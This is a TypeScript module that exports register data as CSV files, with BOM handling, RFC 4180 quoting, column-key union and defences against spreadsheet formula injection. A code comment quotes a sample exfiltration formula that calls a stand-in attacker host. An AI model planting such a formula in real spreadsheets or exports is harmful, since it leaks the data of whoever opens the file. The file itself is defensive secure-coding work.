import { formatDateTimeDDMMYYYY } from '@/shared/utilities/date';

// Module-local CSV export. Copy of the global helper, intentionally duplicated
// so edits to src/lib/utils.ts can never break the establishment module.
// Global rule: dates export as DD-MM-YYYY, timestamps as DD-MM-YYYY HH:MM:SS in IST.

/**
 * UTF-8 BOM so Excel opens the Gujarati text in the right encoding.
 *
 * Written as an ESCAPE, never as a literal U+FEFF in the source: the literal is
 * invisible to a reviewer, survives copy/paste and is silently destroyed by any
 * editor or "strip whitespace" pass — which produces a mojibake file with no
 * visible cause. Matches AdminPostMasterPage.tsx.
 */
const BOM = '\uFEFF';

/** RFC 4180: fields are comma-separated and records end CRLF. */
const SEPARATOR = ',';
const RECORD_END = '\r\n';

/**
 * First characters Excel / LibreOffice / Google Sheets treat as "this cell is a
 * formula" when a CSV is opened: = + - @ and TAB / CR.
 *
 * WHY this matters here: the register's free-text columns (employee name,
 * charge name, centre, ઠરાવ note, mobile, post name) are typed by an office
 * clerk with no sanitisation upstream, land in `TEXT` columns, and are then
 * exported. A clerk who stores
 *   =HYPERLINK("https://attacker.example/leak?x="&A1,"open")
 * gets it EVALUATED on every regional admin who opens the CSV — a
 * cross-trust-boundary exfiltration pivot, and (via DDE) local code execution.
 * A leading `+` is a realistic false positive too, so it is neutralised too.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * Ordered union of every column label across ALL rows, first-seen order wins.
 *
 * WHY not `Object.keys(rows[0])`: a field present on some rows but missing from
 * the FIRST record was dropped from the file entirely — a clerk who fills one
 * optional field on one row would silently lose that column. (Two DIFFERENT
 * fields cannot share a label in a plain object, so header order and labels are
 * left exactly as the caller built them; wide grids whose labels genuinely
 * collide positionally still use the matrix exporter below.)
 *
 * Pure and exported so it can be unit-tested without a DOM or a Blob.
 */
export function unionColumnKeys(rows: Record<string, any>[]): string[] {
  const keys: string[] = [];
  const seen = new Set<string>();
  for (const row of rows) {
    if (!row || typeof row !== 'object') continue;
    for (const key of Object.keys(row)) {
      if (seen.has(key)) continue;
      seen.add(key);
      keys.push(key);
    }
  }
  return keys;
}

/**
 * Encode ONE cell: text coercion → formula neutralisation → RFC-4180 quoting.
 *
 * The single encoding path for the whole module — the header row goes through
 * it too (a label containing , or " would otherwise shear the file into the
 * wrong columns), so headers and cells can never drift apart.
 *
 * Pure: no DOM, no globals, safe to call from a test.
 */
function csvCell(value: unknown): string {
  let cell: string;
  if (value === null || value === undefined) {
    cell = '';
  } else if (value instanceof Date) {
    cell = formatDateTimeDDMMYYYY(value);
  } else {
    cell = value.toString();
  }
  // AFTER coercion, BEFORE quoting: the guard must see the final text, and the
  // apostrophe it adds is quoted like any other character.
  // The bare '-' sentinel carries no payload and is statutory register text;
  // it is not evaluated as a formula, so avoid prefixing it.
  if (FORMULA_LEAD.test(cell) && cell !== '-') cell = `'${cell}`;
  cell = cell.replace(/"/g, '""');
  if (cell.search(/[",\r\n]/) >= 0) cell = `"${cell}"`;
  return cell;
}

/**
 * Encode one record as a line. `row` is omitted for the header line, where each
 * key labels its own cell — see `headerLine`.
 */
function csvLine(keys: string[], row?: Record<string, any>): string {
  const cells: string[] = [];
  for (const k of keys) cells.push(csvCell(row ? row[k] : k));
  return cells.join(SEPARATOR);
}

export function exportEstablishmentCSV(filename: string, rows: Record<string, any>[]) {
  if (!rows.length) return;
  const keys = unionColumnKeys(rows);
  // Build every line into ONE array and join once: the previous version
  // materialised the rows map and the joined result as two full copies of the
  // file before the Blob ever saw it. Lines, not a streaming writer — data
  // volumes here are a few thousand rows at most.
  const lines: string[] = [csvLine(keys)];
  for (const row of rows) lines.push(csvLine(keys, row));

  downloadCsvBlob(BOM + lines.join(RECORD_END) + RECORD_END, filename);
}

function downloadCsvBlob(csvContent: string, filename: string) {
  const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
  const link = document.createElement('a');
  if (link.download !== undefined) {
    const url = URL.createObjectURL(blob);
    link.setAttribute('href', url);
    link.setAttribute('download', filename);
    link.style.visibility = 'hidden';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    // Revoke on the next tick — revoking synchronously can cancel the download
    // in some browsers before it has read the blob.
    setTimeout(() => URL.revokeObjectURL(url), 0);
  }
}

/**
 * Array-of-arrays CSV export.
 *
 * Use this instead of `exportEstablishmentCSV` for wide matrices: positional
 * rows CAN repeat a label ("Total" appears once per block), and the
 * record-shaped variant cannot express two same-named columns at all — which is
 * exactly why this twin exists. Rows are padded to the width of the widest row,
 * so a ragged matrix still produces a rectangular file.
 *
 * Every cell — including the header row — goes through the SAME `csvCell` guard
 * as the record exporter, so formula neutralisation cannot be lost here.
 */
export function exportEstablishmentCSVMatrix(filename: string, rows: (string | number)[][]) {
  if (!rows.length) return;
  const width = rows.reduce((w, r) => Math.max(w, r.length), 0);
  const pad = (r: (string | number)[]) => {
    const out: string[] = [];
    for (let i = 0; i < width; i++) out.push(csvCell(r[i]));
    return out.join(SEPARATOR);
  };
  const lines = rows.map(pad);
  downloadCsvBlob(BOM + lines.join(RECORD_END) + RECORD_END, filename);
}